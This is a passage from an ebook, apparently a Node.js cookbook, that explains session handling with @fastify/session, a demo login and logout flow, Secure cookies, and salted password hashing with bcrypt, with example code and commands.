      <span class="koboSpan" id="kobo.498.1">
       httpOnly: true
      </span>
     </strong>
     <span class="koboSpan" id="kobo.499.1">
      makes the cookie inaccessible to client-side JavaScript,
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.500.1">
       enhancing security.
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.501.1">
       SaveUninitialized
      </span>
     </strong>
     <span class="koboSpan" id="kobo.502.1">
      : Prevents saving unmodified sessions to the store, reducing storage usage and
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.503.1">
       improving performance.
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.504.1">
       Resave
      </span>
     </strong>
     <span class="koboSpan" id="kobo.505.1">
      : Prevents resaving unchanged sessions, reducing unnecessary write operations to the
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.506.1">
       session store.
      </span>
     </span>
    </li>
   </ul>
   <p>
    <span class="koboSpan" id="kobo.507.1">
     The full list of configuration options is available in the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.508.1">
      @fastify/session
     </span>
    </strong>
    <span class="koboSpan" id="kobo.509.1">
     API documentation
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.510.1">
      at
     </span>
    </span>
    <a href="https://github.com/fastify/session?tab=readme-ov-file#api">
     <span class="No-Break">
      <span class="koboSpan" id="kobo.511.1">
       https://github.com/fastify/session?tab=readme-ov-file#api
      </span>
     </span>
    </a>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.512.1">
      .
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.513.1">
     In this recipe’s demo application, the login hyperlink on the web page redirects the user to the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.514.1">
      /auth/login
     </span>
    </strong>
    <span class="koboSpan" id="kobo.515.1">
     endpoint.
    </span>
    <span class="koboSpan" id="kobo.515.2">
     The route handler for this endpoint was declared in a separate authentication router (
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.516.1">
      routes/auth.js
     </span>
    </strong>
    <span class="koboSpan" id="kobo.517.1">
     ).
    </span>
    <span class="koboSpan" id="kobo.517.2">
     This route renders the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.518.1">
      views/login.ejs
     </span>
    </strong>
    <span class="koboSpan" id="kobo.519.1">
     template, which contains the HTML
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.520.1">
      login form.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.521.1">
     When the user enters their username and password in the form and clicks
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.522.1">
      Submit
     </span>
    </strong>
    <span class="koboSpan" id="kobo.523.1">
     , the browser encodes the values and sets them as the request body.
    </span>
    <span class="koboSpan" id="kobo.523.2">
     Our HTML form had its method set to HTTP
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.524.1">
      POST
     </span>
    </strong>
    <span class="koboSpan" id="kobo.525.1">
     (
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.526.1">
      method="post"
     </span>
    </strong>
    <span class="koboSpan" id="kobo.527.1">
     ), which instructs the browser to send an HTTP
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.528.1">
      POST
     </span>
    </strong>
    <span class="koboSpan" id="kobo.529.1">
     request when the form is submitted.
    </span>
    <span class="koboSpan" id="kobo.529.2">
     The
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.530.1">
      action
     </span>
    </strong>
    <span class="koboSpan" id="kobo.531.1">
     attribute in our HTML form was set to
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.532.1">
      login
     </span>
    </strong>
    <span class="koboSpan" id="kobo.533.1">
     , which instructs the browser that the HTTP
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.534.1">
      POST
     </span>
    </strong>
    <span class="koboSpan" id="kobo.535.1">
     request should be sent to the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.536.1">
      /
     </span>
    </strong>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.537.1">
       auth/login
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.538.1">
      endpoint.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.539.1">
     In
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.540.1">
      routes/auth.js
     </span>
    </strong>
    <span class="koboSpan" id="kobo.541.1">
     , we registered a handler for HTTP
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.542.1">
      POST
     </span>
    </strong>
    <span class="koboSpan" id="kobo.543.1">
     requests to the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.544.1">
      /login
     </span>
    </strong>
    <span class="koboSpan" id="kobo.545.1">
     endpoint.
    </span>
    <span class="koboSpan" id="kobo.545.2">
     This handler extracts the username and password from the request body and checks whether they match any user in our hardcoded array of users.
    </span>
    <span class="koboSpan" id="kobo.545.3">
     If the credentials are valid, it saves the user information in the session and renders the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.546.1">
      index.ejs
     </span>
    </strong>
    <span class="koboSpan" id="kobo.547.1">
     template
    </span>
    <a id="_idIndexMarker700">
    </a>
    <span class="koboSpan" id="kobo.548.1">
     with the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.549.1">
      user data.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.550.1">
     If the username and password don’t match, our HTTP
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.551.1">
      POST
     </span>
    </strong>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.552.1">
      /auth/login
     </span>
    </strong>
    <span class="koboSpan" id="kobo.553.1">
     route handler renders the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.554.1">
      views/login.ejs
     </span>
    </strong>
    <span class="koboSpan" id="kobo.555.1">
     template with the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.556.1">
      { fail : true }
     </span>
    </strong>
    <span class="koboSpan" id="kobo.557.1">
     value.
    </span>
    <span class="koboSpan" id="kobo.557.2">
     This instructs the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.558.1">
      views/login.ejs
     </span>
    </strong>
    <span class="koboSpan" id="kobo.559.1">
     template to render the
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.560.1">
      Login
     </span>
    </strong>
    <span class="No-Break">
     <strong class="bold">
      <span class="koboSpan" id="kobo.561.1">
       Failed.
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.562.1">
      message.
     </span>
    </span>
   </p>
   <p class="callout-heading">
    <span class="koboSpan" id="kobo.563.1">
     Important note
    </span>
   </p>
   <p class="callout">
    <span class="koboSpan" id="kobo.564.1">
     Don’t store passwords in plain text in production applications!
    </span>
    <span class="koboSpan" id="kobo.564.2">
     You’d typically validate the supplied username and password against credentials stored in a secure database, with the password being stored in a hashed form.
    </span>
    <span class="koboSpan" id="kobo.564.3">
     Refer to the
    </span>
    <em class="italic">
     <span class="koboSpan" id="kobo.565.1">
      There’s more…
     </span>
    </em>
    <span class="koboSpan" id="kobo.566.1">
     section of this recipe on hashing
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.567.1">
      with
     </span>
    </span>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.568.1">
       bcrypt
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.569.1">
      .
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.570.1">
     When the authentication process is successful, we set the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.571.1">
      req.session.user
     </span>
    </strong>
    <span class="koboSpan" id="kobo.572.1">
     value to the supplied username and redirect the authenticated user back to the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.573.1">
      /
     </span>
    </strong>
    <span class="koboSpan" id="kobo.574.1">
     endpoint.
    </span>
    <span class="koboSpan" id="kobo.574.2">
     At this point, the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.575.1">
      @fastify/session
     </span>
    </strong>
    <span class="koboSpan" id="kobo.576.1">
     middleware creates a session identifier and sets the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.577.1">
      Set-Cookie
     </span>
    </strong>
    <span class="koboSpan" id="kobo.578.1">
     HTTP header on the request.
    </span>
    <span class="koboSpan" id="kobo.578.2">
     The
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.579.1">
      Set-Cookie
     </span>
    </strong>
    <span class="koboSpan" id="kobo.580.1">
     header is set to the session key name and
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.581.1">
      session identifier.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.582.1">
     The
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.583.1">
      @fastify/session
     </span>
    </strong>
    <span class="koboSpan" id="kobo.584.1">
     plugin defaults to using an in-process storage mechanism to store the session tokens.
    </span>
    <span class="koboSpan" id="kobo.584.2">
     However, these tokens are not expired, which means our process will continue to be populated with more and more tokens.
    </span>
    <span class="koboSpan" id="kobo.584.3">
     This could eventually result in degraded performance or crash our process.
    </span>
    <span class="koboSpan" id="kobo.584.4">
     Again, in production, you’d typically use a session store.
    </span>
    <span class="koboSpan" id="kobo.584.5">
     The
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.585.1">
      @fastify/session
     </span>
    </strong>
    <span class="koboSpan" id="kobo.586.1">
     plugin is based on the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.587.1">
      express-session
     </span>
    </strong>
    <span class="koboSpan" id="kobo.588.1">
     list of compatible session stores
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.589.1">
      at
     </span>
    </span>
    <a href="https://github.com/expressjs/session#compatible-session-stores">
     <span class="No-Break">
      <span class="koboSpan" id="kobo.590.1">
       https://github.com/expressjs/session#compatible-session-stores
      </span>
     </span>
    </a>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.591.1">
      .
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.592.1">
     When the request is redirected to
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.593.1">
      /
     </span>
    </strong>
    <span class="koboSpan" id="kobo.594.1">
     , it now has the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.595.1">
      Set-Cookie
     </span>
    </strong>
    <span class="koboSpan" id="kobo.596.1">
     HTTP header set.
    </span>
    <span class="koboSpan" id="kobo.596.2">
     The
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.597.1">
      @fastify/session
     </span>
    </strong>
    <span class="koboSpan" id="kobo.598.1">
     middleware recognizes the session key name and extracts the session identifier.
    </span>
    <span class="koboSpan" id="kobo.598.2">
     From this identifier,
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.599.1">
      @fastify/session
     </span>
    </strong>
    <span class="koboSpan" id="kobo.600.1">
     can query session storage for any associated state.
    </span>
    <span class="koboSpan" id="kobo.600.2">
     In this case, the state is the user object that we assign to the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.601.1">
      req.session
     </span>
    </strong>
    <span class="koboSpan" id="kobo.602.1">
     object
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.603.1">
      in
     </span>
    </span>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.604.1">
       auth.js
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.605.1">
      .
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.606.1">
     The
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.607.1">
      req.session.user
     </span>
    </strong>
    <span class="koboSpan" id="kobo.608.1">
     value is passed through to the updated
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.609.1">
      views/index.ejs
     </span>
    </strong>
    <span class="koboSpan" id="kobo.610.1">
     template.
    </span>
    <span class="koboSpan" id="kobo.610.2">
     This template contains logic such that when a
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.611.1">
      req.session.user
     </span>
    </strong>
    <span class="koboSpan" id="kobo.612.1">
     value is present, it will render the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.613.1">
      Hello beth!
     </span>
    </strong>
    <span class="koboSpan" id="kobo.614.1">
     string.
    </span>
    <span class="koboSpan" id="kobo.614.2">
     The logic in the template also switches between showing the
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.615.1">
      Login
     </span>
    </strong>
    <span class="koboSpan" id="kobo.616.1">
     or
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.617.1">
      Logout
     </span>
    </strong>
    <span class="koboSpan" id="kobo.618.1">
     link, depending on whether the user
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.619.1">
      is authenticated.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.620.1">
     Clicking
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.621.1">
      Logout
     </span>
    </strong>
    <span class="koboSpan" id="kobo.622.1">
     sends an HTTP
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.623.1">
      GET
     </span>
    </strong>
    <span class="koboSpan" id="kobo.624.1">
     request to the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.625.1">
      /auth/logout
     </span>
    </strong>
    <span class="koboSpan" id="kobo.626.1">
     endpoint.
    </span>
    <span class="koboSpan" id="kobo.626.2">
     This endpoint sets
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.627.1">
      req.session
     </span>
    </strong>
    <span class="koboSpan" id="kobo.628.1">
     to
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.629.1">
      null
     </span>
    </strong>
    <span class="koboSpan" id="kobo.630.1">
     , which ends the session and removes session data from the session store.
    </span>
    <span class="koboSpan" id="kobo.630.2">
     Our browser may continue to store and send the invalid session cookie until it
    </span>
    <a id="_idIndexMarker701">
    </a>
    <span class="koboSpan" id="kobo.631.1">
     expires, but with no valid match in the session store, the server will ignore the session and consider the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.632.1">
      user unauthenticated.
     </span>
    </span>
   </p>
   <h2 id="_idParaDest-280">
    <a id="_idTextAnchor287">
    </a>
    <span class="koboSpan" id="kobo.633.1">
     There’s more…
    </span>
   </h2>
   <p>
    <span class="koboSpan" id="kobo.634.1">
     The following sections will cover secure session cookies and a simple example of how to hash
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.635.1">
      a password.
     </span>
    </span>
   </p>
   <h3>
    <span class="koboSpan" id="kobo.636.1">
     Secure session cookies
    </span>
   </h3>
   <p>
    <span class="koboSpan" id="kobo.637.1">
     Session cookies can
    </span>
    <a id="_idIndexMarker702">
    </a>
    <span class="koboSpan" id="kobo.638.1">
     be marked with a
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.639.1">
      Secure
     </span>
    </strong>
    <span class="koboSpan" id="kobo.640.1">
     attribute.
    </span>
    <span class="koboSpan" id="kobo.640.2">
     The
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.641.1">
      Secure
     </span>
    </strong>
    <span class="koboSpan" id="kobo.642.1">
     attribute forces the browser to not use HTTP to send cookies back to the server.
    </span>
    <span class="koboSpan" id="kobo.642.2">
     This is to avoid
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.643.1">
      man-in-the-middle
     </span>
    </strong>
    <span class="koboSpan" id="kobo.644.1">
     (
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.645.1">
      MITM
     </span>
    </strong>
    <span class="koboSpan" id="kobo.646.1">
     ) attacks.
    </span>
    <span class="koboSpan" id="kobo.646.2">
     In
    </span>
    <a id="_idIndexMarker703">
    </a>
    <span class="koboSpan" id="kobo.647.1">
     production applications, HTTPS and secure cookies should be used.
    </span>
    <span class="koboSpan" id="kobo.647.2">
     But in development, it’s easier to
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.648.1">
      use HTTP.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.649.1">
     It’s typical for a production environment to apply SSL encryption at the load balancer layer.
    </span>
    <span class="koboSpan" id="kobo.649.2">
     A load balancer is a technology in an application architecture that’s responsible for boosting the efficiency of the application by distributing a set of tasks over a set of resources – for example, distributing login requests
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.650.1">
      to servers.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.651.1">
     We can configure our Fastify server to communicate with a load balancer over HTTP but still support
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.652.1">
      Secure
     </span>
    </strong>
    <span class="koboSpan" id="kobo.653.1">
     cookies using the appropriate cookie settings.
    </span>
    <span class="koboSpan" id="kobo.653.2">
     In production, the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.654.1">
      Secure
     </span>
    </strong>
    <span class="koboSpan" id="kobo.655.1">
     option for
    </span>
    <a id="_idIndexMarker704">
    </a>
    <span class="koboSpan" id="kobo.656.1">
     cookies should be set
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.657.1">
      to true.
     </span>
    </span>
   </p>
   <h3>
    <span class="koboSpan" id="kobo.658.1">
     Hashing with bcrypt
    </span>
   </h3>
   <p>
    <span class="koboSpan" id="kobo.659.1">
     Passwords should
    </span>
    <a id="_idIndexMarker705">
    </a>
    <span class="koboSpan" id="kobo.660.1">
     never be stored in plain text and should instead be stored in a hashed form.
    </span>
    <span class="koboSpan" id="kobo.660.2">
     Passwords are transformed into a hashed form
    </span>
    <a id="_idIndexMarker706">
    </a>
    <span class="koboSpan" id="kobo.661.1">
     using a
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.662.1">
      hashing function
     </span>
    </strong>
    <span class="koboSpan" id="kobo.663.1">
     .
    </span>
    <span class="koboSpan" id="kobo.663.2">
     Hashing functions use an algorithm to transform a value into unrecognizable data.
    </span>
    <span class="koboSpan" id="kobo.663.3">
     The transformation is one-way, meaning it’s unlikely to be possible to determine the value from the hash.
    </span>
    <span class="koboSpan" id="kobo.663.4">
     A website will validate a user’s password input by applying the hashing function to the supplied password and comparing it to the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.664.1">
      stored hash.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.665.1">
     Hashing is typically combined with a technique
    </span>
    <a id="_idIndexMarker707">
    </a>
    <span class="koboSpan" id="kobo.666.1">
     called
    </span>
    <strong class="bold">
     <span class="koboSpan" id="kobo.667.1">
      salting
     </span>
    </strong>
    <span class="koboSpan" id="kobo.668.1">
     .
    </span>
    <span class="koboSpan" id="kobo.668.2">
     Salting is where a unique value, referred to as the
    </span>
    <em class="italic">
     <span class="koboSpan" id="kobo.669.1">
      salt
     </span>
    </em>
    <span class="koboSpan" id="kobo.670.1">
     , is appended to the password before the hash is generated.
    </span>
    <span class="koboSpan" id="kobo.670.2">
     This helps to protect against brute-force attacks and makes it more difficult to crack
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.671.1">
      the password.
     </span>
    </span>
   </p>
   <p>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.672.1">
      bcrypt
     </span>
    </strong>
    <span class="koboSpan" id="kobo.673.1">
     (
    </span>
    <a href="https://www.npmjs.com/package/bcrypt">
     <span class="koboSpan" id="kobo.674.1">
      https://www.npmjs.com/package/bcrypt
     </span>
    </a>
    <span class="koboSpan" id="kobo.675.1">
     ) is a
    </span>
    <a id="_idIndexMarker708">
    </a>
    <span class="koboSpan" id="kobo.676.1">
     popular module that’s used to hash passwords in Node.js.
    </span>
    <span class="koboSpan" id="kobo.676.2">
     The following example demonstrates how to generate a hash with a salt using the
    </span>
    <span class="No-Break">
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.677.1">
       bcrypt
      </span>
     </strong>
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.678.1">
      module:
     </span>
    </span>
   </p>
   <ol>
    <li>
     <span class="koboSpan" id="kobo.679.1">
      First, create and initialize a directory
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.680.1">
       named
      </span>
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.681.1">
        hashing-with-bcrypt
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.682.1">
       :
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.683.1">$ mkdir hashing-with-bcrypt</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.684.1">$ cd hashing-with-bcrypt</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.685.1">$ npm init --yes</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.686.1">$ touch hash.js validate-password.js</span></strong></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.687.1">
      Next, install the
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.688.1">
        bcrypt
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.689.1">
       module:
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.690.1">$ npm install bcrypt</span></strong></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.691.1">
      Our program will expect the password to be supplied as an argument.
     </span>
     <span class="koboSpan" id="kobo.691.2">
      Add the following to
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.692.1">
       hash.js
      </span>
     </strong>
     <span class="koboSpan" id="kobo.693.1">
      to extract the
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.694.1">
       argument value:
      </span>
     </span>
     <pre class="source-code"><span class="koboSpan" id="kobo.695.1">
const password = process.argv[2];</span></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.696.1">
      Next, in
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.697.1">
       hash.js
      </span>
     </strong>
     <span class="koboSpan" id="kobo.698.1">
      , import the
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.699.1">
        bcrypt
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.700.1">
       module:
      </span>
     </span>
     <pre class="source-code"><span class="koboSpan" id="kobo.701.1">
const bcrypt = require('bcrypt');</span></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.702.1">
      Now, we must define the number of salt rounds.
     </span>
     <span class="koboSpan" id="kobo.702.2">
      Here,
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.703.1">
       bcrypt
      </span>
     </strong>
     <span class="koboSpan" id="kobo.704.1">
      will generate a salt using the specified number of rounds.
     </span>
     <span class="koboSpan" id="kobo.704.2">
      The higher the number of rounds, the more secure the hash will be.
     </span>
     <span class="koboSpan" id="kobo.704.3">
      However, it will also take longer to generate and validate the hash in your application.
     </span>
     <span class="koboSpan" id="kobo.704.4">
      In this example, we’ll set the number of salt rounds
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.705.1">
       to
      </span>
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.706.1">
        10
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.707.1">
       :
      </span>
     </span>
     <pre class="source-code"><span class="koboSpan" id="kobo.708.1">
const saltRounds = 10;</span></pre>
    </li>
    <li>
     <span class="koboSpan" id="kobo.709.1">
      Next, we need to call the
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.710.1">
       bcrypt
      </span>
     </strong>
     <span class="koboSpan" id="kobo.711.1">
      module’s
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.712.1">
       hash()
      </span>
     </strong>
     <span class="koboSpan" id="kobo.713.1">
      method.
     </span>
     <span class="koboSpan" id="kobo.713.2">
      We supply this method with the plain text password, the number of salt rounds, and the callback function to
     </span>
     <a id="_idIndexMarker709">
     </a>
     <span class="koboSpan" id="kobo.714.1">
      be executed once the hash has been generated.
     </span>
     <span class="koboSpan" id="kobo.714.2">
      Our callback will output the hashed form of the password using
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.715.1">
       conosle.log()
      </span>
     </strong>
     <span class="koboSpan" id="kobo.716.1">
      .
     </span>
     <span class="koboSpan" id="kobo.716.2">
      Add the following
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.717.1">
       to
      </span>
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.718.1">
        hash.js
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.719.1">
       :
      </span>
     </span>
     <pre class="source-code"><span class="koboSpan" id="kobo.720.1">
bcrypt.hash(password, saltRounds, (err, hash) =&gt; {
  if (err) {
    console.error('Error hashing password:', err);
    process.exit(1);
  } else {
    console.log(hash);
  }
});</span></pre>
     <p class="list-inset">
      <span class="koboSpan" id="kobo.721.1">
       In a real application, you’d expect to include your logic to persist the hash to a database within the
      </span>
      <span class="No-Break">
       <span class="koboSpan" id="kobo.722.1">
        callback function.
       </span>
      </span>
     </p>
    </li>
    <li>
     <span class="koboSpan" id="kobo.723.1">
      Run the program with the following command.
     </span>
     <span class="koboSpan" id="kobo.723.2">
      You should expect a unique hash to
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.724.1">
       be generated:
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.725.1">$ node hash.js 'badpassword'</span></strong>
<strong class="bold"><span class="koboSpan" id="kobo.726.1">$2b$10$7/156fF/0lyqzB2pxHQJE.czJj5xZjN3N8jofXUxXi.UG5X3KAzDO</span></strong></pre>
     <p class="list-inset">
      <span class="koboSpan" id="kobo.727.1">
       Each time this script is run, a new unique hash will
      </span>
      <span class="No-Break">
       <span class="koboSpan" id="kobo.728.1">
        be generated.
       </span>
      </span>
     </p>
    </li>
    <li>
     <span class="koboSpan" id="kobo.729.1">
      Next, let’s learn how we can validate the password.
     </span>
     <span class="koboSpan" id="kobo.729.2">
      We’ll create a program that expects both the password and the hash as arguments.
     </span>
     <span class="koboSpan" id="kobo.729.3">
      The program will compare the
     </span>
     <a id="_idIndexMarker710">
     </a>
     <span class="koboSpan" id="kobo.730.1">
      password and hash using the
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.731.1">
        bcrypt.compare()
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.732.1">
       method:
      </span>
     </span>
     <pre class="source-code"><span class="koboSpan" id="kobo.733.1">
const password = process.argv[2];
const hash = process.argv[3];
const bcrypt = require('bcrypt');
bcrypt
  .compare(password, hash)
  .then((res) =&gt; {
    console.log(res);
  })
  .catch((err) =&gt; console.error(err.message));</span></pre>
     <p class="list-inset">
      <span class="koboSpan" id="kobo.734.1">
       Note that
      </span>
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.735.1">
        res
       </span>
      </strong>
      <span class="koboSpan" id="kobo.736.1">
       will be
      </span>
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.737.1">
        true
       </span>
      </strong>
      <span class="koboSpan" id="kobo.738.1">
       when the password and hash match and
      </span>
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.739.1">
        false
       </span>
      </strong>
      <span class="koboSpan" id="kobo.740.1">
       when
      </span>
      <span class="No-Break">
       <span class="koboSpan" id="kobo.741.1">
        they don’t.
       </span>
      </span>
     </p>
    </li>
    <li>
     <span class="koboSpan" id="kobo.742.1">
      Run the
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.743.1">
       validate-password.js
      </span>
     </strong>
     <span class="koboSpan" id="kobo.744.1">
      program.
     </span>
     <span class="koboSpan" id="kobo.744.2">
      The first argument should be the same password you supplied to the
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.745.1">
       hash.js
      </span>
     </strong>
     <span class="koboSpan" id="kobo.746.1">
      program.
     </span>
     <span class="koboSpan" id="kobo.746.2">
      The second argument should be the hash that your
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.747.1">
       hash.js
      </span>
     </strong>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.748.1">
       program created:
      </span>
     </span>
     <pre class="source-code">
<strong class="bold"><span class="koboSpan" id="kobo.749.1">$ node validate-password.js 'badpassword' '$2b$10$7/156fF/0lyqzB2pxHQJE.czJj5xZjN3N8jofXUxXi.UG5X3KAzDO'</span></strong><span class="koboSpan" id="kobo.750.1">
true</span></pre>
     <p class="list-inset">
      <span class="koboSpan" id="kobo.751.1">
       Note that the argument values should be wrapped in single quotes to ensure the literal values
      </span>
      <span class="No-Break">
       <span class="koboSpan" id="kobo.752.1">
        are preserved.
       </span>
      </span>
     </p>
    </li>
   </ol>
   <p>
    <span class="koboSpan" id="kobo.753.1">
     This demonstrates
    </span>
    <a id="_idIndexMarker711">
    </a>
    <span class="koboSpan" id="kobo.754.1">
     how we can use the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.755.1">
      bcrypt
     </span>
    </strong>
    <span class="koboSpan" id="kobo.756.1">
     module to create a hash, as well as how to validate a value against an
    </span>
    <span class="No-Break">
